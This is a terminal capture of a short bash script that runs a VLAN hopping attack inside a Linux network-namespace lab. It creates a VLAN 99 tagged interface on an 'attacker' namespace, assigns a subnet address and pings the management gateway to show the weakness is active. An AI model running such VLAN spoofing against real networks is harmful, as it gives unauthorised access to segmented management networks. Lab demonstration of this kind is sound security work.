root@zeroboot:~# cat run_attack.sh
#!/bin/bash
# 2_run_attack.sh - FIXED

echo "Launching VLAN Hopping Attack ---"

# 2. CREATE (VLAN Hopping)
echo "Creating Interface 'veth.99' (Spoofing VLAN 99)..."
# We act as the attacker manually creating a tagged interface
ip netns exec attacker_pc ip link add link veth_hack_pc name veth.99 type vlan id 99

# 3. CONFIGURE IP
# We pick a valid random IP in the target subnet
echo "Assigning IP 192.168.99.66..."
ip netns exec attacker_pc ip addr add 192.168.99.66/24 dev veth.99
ip netns exec attacker_pc ip link set veth.99 up

# 4. EXECUTE PING
echo "Pinging Management Gateway (192.168.99.1)..."
# We wait 1 second (-W 1) for a reply to avoid hanging
ip netns exec attacker_pc ping -c 3 192.168.99.1

echo "INTERPRETATION:"
echo " - with the response '64 bytes from...', the Vulnerability is ACTIVE."
root@zeroboot:~#
